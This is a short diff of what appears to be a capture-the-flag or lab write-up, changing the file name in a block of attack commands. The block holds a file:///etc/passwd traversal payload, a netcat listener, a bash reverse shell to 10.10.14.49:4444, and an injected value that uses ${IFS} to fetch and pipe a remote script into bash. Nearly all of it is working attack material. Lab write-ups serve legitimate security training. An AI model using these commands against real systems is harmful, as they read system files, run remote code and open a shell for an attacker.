@@ -24,7 +24,7 @@ file:///etc/passwd?/../passwd
 <pre><code>
 python3 -m http.server 7000
 nc -lnvp 4444
-echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > revtest.sh
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
 test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
 
 </code></pre>
